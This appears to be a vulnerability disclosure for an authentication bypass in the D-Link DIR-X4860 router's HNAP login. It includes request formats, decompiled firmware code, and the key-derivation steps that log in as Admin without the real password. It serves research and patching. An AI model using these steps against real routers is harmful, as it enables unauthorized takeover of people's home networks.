## D-Link DIR-X4860 Routers HNAP PrivateLogin Incorrect Implementation of Authentication Algorithm Authentication Bypass Vulnerability

### 1.Vulnerability description

The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper implementation of the authentication algorithm. An attacker can leverage this vulnerability to escalate privileges and execute code in the context of the router.<br>

This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of DIR-X4860 routers. Authentication is not required to exploit this vulnerability.<br>



The vulnerability exists in the latest firmware version ： DIRX4860A1_FWV1.04B03.bin<br>

Firmware download address : https://support.dlink.com/ProductInfo.aspx?m=DIR-X4860-US<br>

### 2.Vulnerability details

#### 2.1 HNAP protocol

Step 1: Send the login request and wait for the response.<br>
The requested packet format is as follows:<br>

```c
Headers:
"Content-Type": "text/xml; charset=utf-8"
"SOAPAction": "http://purenetworks.com/HNAP1/Login"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action>request</Action>
      <Username>Admin</Username>
      <LoginPassword/>
      <Captcha/>
    </Login>
  </soap:Body>
</soap:Envelope>
```

The response data are as follows:<br>

```c
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <LoginResponse xmlns="http://purenetworks.com/HNAP1/">
      <LoginResult>OK</LoginResult>
      <Challenge>........</Challenge>
      <Cookie>........</Cookie>
      <PublicKey>........</PublicKey>
    </LoginResponse>
  </soap:Body>
</soap:Envelope>
```

The response packet returns Challenge, Cookie, PublicKey.<br>

The Cookie is used as the cookie header for all subsequent http requests.<br>

Challenge and PublicKey are used to encrypt the password and generate HNAP_AUTH authentication in the http header.<br>



Step 2: Send the login login and wait for the response.<br>
The requested packet format is as follows:<br>

```xml
Headers:
"Content-Type": "text/xml; charset=utf-8"
"SOAPAction": "http://purenetworks.com/HNAP1/Login"
"HNAP_AUTH": "........"
"Cookie": "uid=........"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action>login</Action>
      <Username>Admin</Username>
      <LoginPassword>........</LoginPassword>
      <Captcha/>
    </Login>
  </soap:Body>
</soap:Envelope>
```

The key values are calculated in the following way:<br>

```
LoginPassword:
	PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
	LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
uid : 
	uid = Cookie
HNAP_AUTH:
    SOAP_NAMESPACE2 = "http://purenetworks.com/HNAP1/"
    Action = "Login"
    SOAPAction = '"' + SOAP_NAMESPACE2 + Action + '"'
    Time = int(round(time.time() * 1000))
    Time = math.floor(Time) % 2000000000000
    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
```

The response data are as follows:<br>

```
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <LoginResponse xmlns="http://purenetworks.com/HNAP1/">
      <LoginResult>success</LoginResult>
    </LoginResponse>
  </soap:Body>
</soap:Envelope>
```

If the value of LoginResult is success, the authentication succeeds.<br>

If LoginResult is failed, authentication fails.<br>

#### 2.2 Vulnerability analysis

The vulnerability is in the /bin/prog.cgi file.<br>

The vulnerability occurs in the function that handles the login request.<br>

```
int __fastcall sub_5394C(int a1, int a2, int a3, int a4)
{
  int v5; // r1
  char *v6; // r0
  const char *v7; // r5
  const char *v8; // r5
  int v10; // r0
  int v11; // r1
  int v12; // r2
  int v13; // r3

  sub_53074(a1, a2, a3, a4);
  if ( sub_51038(a1) )
  {
    v6 = GetHNAPParam(a1, "/Login/Action");
    v7 = v6;
    if ( v6 )
    {
      if ( !strncmp(v6, "request", 7u) )
      {
        handle_login_request(a1); // into here !!!
        return 1;
      }
      ******
}

int __fastcall handle_login_request(int a1)
{
  char *Username; // r11
  int v3; // r5
  int result; // r0
  const char *PrivateLogin; // [sp+Ch] [bp-84h]
  char s[64]; // [sp+10h] [bp-80h] BYREF
  char v7[64]; // [sp+50h] [bp-40h] BYREF
  char v8[64]; // [sp+90h] [bp+0h] BYREF
  char http_password[64]; // [sp+D0h] [bp+40h] BYREF
  char v10[128]; // [sp+110h] [bp+80h] BYREF

  memset(s, 0, sizeof(s));
  memset(v7, 0, sizeof(v7));
  memset(v8, 0, sizeof(v8));
  memset(http_password, 0, sizeof(http_password));
  memset(v10, 0, sizeof(v10));
  if ( sub_51FE4(a1) )
  {
    sub_5322C(a1, 5);
    result = 0;
  }
  else
  {
    GetHNAPParam(a1, "/Login/Action");
    Username = GetHNAPParam(a1, "/Login/Username");
    GetHNAPParam(a1, "/Login/LoginPassword");
    GetHNAPParam(a1, "/Login/Captcha");
    PrivateLogin = GetHNAPParam(a1, "/Login/PrivateLogin");
    sub_50F98(s, 20);
    sub_50F98(v7, 10);
    sub_50F98(v8, 20);
    if ( PrivateLogin && !strncmp(PrivateLogin, "Username", 8u) )
      strncpy(http_password, Username, 0x40u); // Authentication Bypass!!
    else
      get_http_password(http_password, 0x40u);
    sub_51284(s, http_password, v8, v10, 128);
    v3 = sub_51468(a1, v10, s, v7, v8);
    sub_51094(a1, v7);
    sub_5322C(a1, 0);
    result = v3;
  }
  return result;
}
```

The normal logic in the handle_login_request function is to get the http_password and then generate the PrivateKey from the http_password.<br>

However, when the PrivateLogin parameter is included in the request, and the value of the PrivateLogin parameter is "Username", then the PrivateKey is generated from the value of the Username parameter.<br>

The Username parameter has a known value of "Admin".<br>

This means that when you perform a login login request, you can use "Admin" as the password to calculate the relevant data without knowing the real password:<br>

```
LoginPassword:
	password = ”Admin"
	PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
	LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
uid : 
	uid = Cookie
HNAP_AUTH:
    SOAP_NAMESPACE2 = "http://purenetworks.com/HNAP1/"
    Action = "Login"
    SOAPAction = '"' + SOAP_NAMESPACE2 + Action + '"'
    Time = int(round(time.time() * 1000))
    Time = math.floor(Time) % 2000000000000
    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
```

This bypasses login authentication.<br>

### 3.Vulnerability exploitation

The effect of the current exploitation is login authentication bypass.